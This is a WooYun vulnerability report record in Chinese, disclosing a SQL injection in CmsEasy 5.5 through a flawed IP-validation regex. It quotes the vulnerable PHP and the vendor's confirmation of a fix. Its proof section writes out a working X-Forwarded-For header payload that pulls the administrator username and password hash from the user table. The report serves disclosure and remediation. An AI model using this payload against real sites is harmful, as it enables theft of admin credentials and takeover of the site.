{"id": 1600, "wybug_id": "wooyun-2014-063657", "wybug_title": "CmsEasy最新版SQL注入可获取管理员账户", "wybug_corp": "cmseasy", "wybug_author": "xfkxfk", "wybug_date": "2014-06-06 18:29", "wybug_open_date": "2014-09-04 18:30", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "安全意识不足", "源码审核", "源码分析", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-06：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-06-07：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-06-10：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-08-01：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-08-11：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-08-21：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-09-04：\t细节向公众公开  简要描述： CmsEasy最新版SQL注入可获取管理员账户 详细说明：  与： WooYun: CmsEasy最新版本无限制SQL注射  重复CmsEasy_5.5_UTF-8_20140420官方最新包文件/lib/default/archive_act.php在提交订单时：\nfunction orders_action() {        $this->view->aid = trim(front::get('aid'));        if (front::post('submit')) {        \t$this->orders = new orders();        \t$row = $this->orders->getrow(\"\",\"adddate DESC\");        \t//var_dump(time());        \tif($row['adddate'] && time() - $row['adddate'] <= intval(config::get('order_time'))){        \t\talerterror('操作频繁,请稍后再试');        \t\treturn;        \t}            if (front::$post['telphone'] == '') {                alerterror('联系电话为必填！');                return;            }            front::$post['mid'] = $this->view->user['userid'] ? $this->view->user['userid'] : 0;            front::$post['adddate'] = time();            front::$post['ip'] = front::ip();            if (isset(front::$post['aid'])) {                $aidarr = front::$post['aid'];                unset(front::$post['aid']);                foreach ($aidarr as $val) {                    front::$post['aid'].=$val . ',';                    front::$post['pnums'].=front::$post['thisnum'][$val] . ',';                }            } else {                front::$post['aid'] = $this->view->aid;            }            if (!isset(front::$post['logisticsid']))                front::$post['logisticsid'] = 0;            front::$post['oid'] = date('YmdHis') . '-' . front::$post['logisticsid'] . '-' . front::$post['mid'] . '-' . front::$post['payname'];                        $insert = $this->orders->rec_insert(front::$post);            if ($insert < 1) {                front::flash($this->tname . lang('添加失败！'));            } else {            \tif (config::get('sms_on') && config::get('sms_order_on')) {            \t\tsendMsg(front::$post['telphone'], config::get('sms_order'));            \t}            \tif (config::get('sms_on') && config::get('sms_order_admin_on') && $mobile = config::get('site_mobile')) {            \t\tsendMsg($mobile, '网站在' . date('Y-m-d H:i:s') . '有新订单了');            \t\t//echo 11;            \t}            \t$user = $this->view->user;            \tif(config::get('email_order_send_cust') && $user['e_mail']){            \t\t$title = \"您在\".config::get('sitename').\"的订单\".front::get('oid').\"已提交\";            \t\t$this->sendmail($user['e_mail'], $title, $title);            \t}            \tif(config::get('email_order_send_admin') && config::get('email')){            \t\t$title = '网站在' . date('Y-m-d H:i:s') . '有新订单了';            \t\t$this->sendmail(config::get('email'), $title, $title);            \t}                if (front::$post['payname'] && front::$post['payname'] != 'nopay') {                                        echo '<script type=\"text/javascript\">alert(\"' . lang('orderssuccess') . ' ' . lang('现在转入支付页面') . '\");window.location.href=\"' . url('archive/payorders/oid/' . front::$post['oid'], true) . '\";</script>';                }                echo '<script type=\"text/javascript\">alert(\"' . lang('orderssuccess') . '\");window.location.href=\"' . url('archive/orders/oid/' . front::$post['oid'], true) . '\";</script>';            }\n front::$post['ip'] = front::ip();我们来看看这里的ip()函数：\nstatic function ip() {        if ($_SERVER['HTTP_CLIENT_IP']) {            $onlineip = $_SERVER['HTTP_CLIENT_IP'];        }        elseif ($_SERVER['HTTP_X_FORWARDED_FOR']) {            $onlineip = $_SERVER['HTTP_X_FORWARDED_FOR'];        }        elseif ($_SERVER['REMOTE_ADDR']) {            $onlineip = $_SERVER['REMOTE_ADDR'];        }        else {            $onlineip = $_SERVER['REMOTE_ADDR'];        }\t\tif(config::get('ipcheck_enable')){\t\t\tif(!preg_match('/^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$/', $onlineip)&&!preg_match('@^\\s*((([0-9A-Fa-f]{1,4}:){7}(([0-9A-Fa-f]{1,4})|:))|(([0-9A-Fa-f]{1,4}:){6}(:|((25[0-5]|2[0-4]\\d|[01]?\\d{1,2})(\\.(25[0-5]|2[0-4]\\d|[01]?\\d{1,2})){3})|(:[0-9A-Fa-f]{1,4})))|(([0-9A-Fa-f]{1,4}:){5}((:((25[0-5]|2[0-4]\\d|[01]?\\d{1,2})(\\.(25[0-5]|2[0-4]\\d|[01]?\\d{1,2})){3})?)|((:[0-9A-Fa-f]{1,4}){1,2})))|(([0-9A-Fa-f]{1,4}:){4}(:[0-9A-Fa-f]{1,4}){0,1}((:((25[0-5]|2[0-4]\\d|[01]?\\d{1,2})(\\.(25[0-5]|2[0-4]\\d|[01]?\\d{1,2})){3})?)|((:[0-9A-Fa-f]{1,4}){1,2})))|(([0-9A-Fa-f]{1,4}:){3}(:[0-9A-Fa-f]{1,4}){0,2}((:((25[0-5]|2[0-4]\\d|[01]?\\d{1,2})(\\.(25[0-5]|2[0-4]\\d|[01]?\\d{1,2})){3})?)|((:[0-9A-Fa-f]{1,4}){1,2})))|(([0-9A-Fa-f]{1,4}:){2}(:[0-9A-Fa-f]{1,4}){0,3}((:((25[0-5]|2[0-4]\\d|[01]?\\d{1,2})(\\.(25[0-5]|2[0-4]\\d|[01]?\\d{1,2})){3})?)|((:[0-9A-Fa-f]{1,4}){1,2})))|(([0-9A-Fa-f]{1,4}:)(:[0-9A-Fa-f]{1,4}){0,4}((:((25[0-5]|2[0-4]\\d|[01]?\\d{1,2})(\\.(25[0-5]|2[0-4]\\d|[01]?\\d{1,2})){3})?)|((:[0-9A-Fa-f]{1,4}){1,2})))|(:(:[0-9A-Fa-f]{1,4}){0,5}((:((25[0-5]|2[0-4]\\d|[01]?\\d{1,2})(\\.(25[0-5]|2[0-4]\\d|[01]?\\d{1,2})){3})?)|((:[0-9A-Fa-f]{1,4}){1,2})))|(((25[0-5]|2[0-4]\\d|[01]?\\d{1,2})(\\.(25[0-5]|2[0-4]\\d|[01]?\\d{1,2})){3})))(%.+)?\\s*$@', $onlineip)){\t\t\t\texit('来源非法');\t\t\t}\t\t}        return $onlineip;    }\n这里的正则存在问题，最后一句的(%.+)，这里我们在IP后面加上%，然后就能跟上任意内容那么我们使用1.1.1.1%xxx就能绕过正则进行注入了。   漏洞证明：  第一步首先添加一件物品\n\n第二步提交订单，此时截包修改头信息，添加：\nX-Forwarded-For: 1.1.1.1%','15,','1,',(select concat(username,0x23,password) from cmseasy_user limit 0,1))#\n\n\n第三步会员中心，查询订单\n\n订单编号即为注入的内容，管理员的用户名密码   修复方案：  严格控制正则，进入sql时对value进行过滤等。   版权声明：转载请注明来源 xfkxfk@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-06-07 13:37 厂商回复： 已经对ip认证部分做了修改，新版此漏洞已经修正了 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-06-06 18:52 |    \t\tMosuan \t\t\t( 普通白帽子  |\t\t\t        Rank:449 漏洞数:175        | 尘封此号，不装逼了，再见孩子们。by Mosua...)\t\t \n  求绕过的姿态    \n     2014-06-06 19:59 |    \t\tmramydnei \t\t\t( 普通白帽子  |\t\t\t        Rank:348 漏洞数:80        )\t\t \n  看你刷的好开心的样子 >.<我也来一发    \n     2014-06-07 02:33 |    \t\t邪恶大咖 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:3        )\t\t \n  专业卖黑阔三十年、两块钱一斤！    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}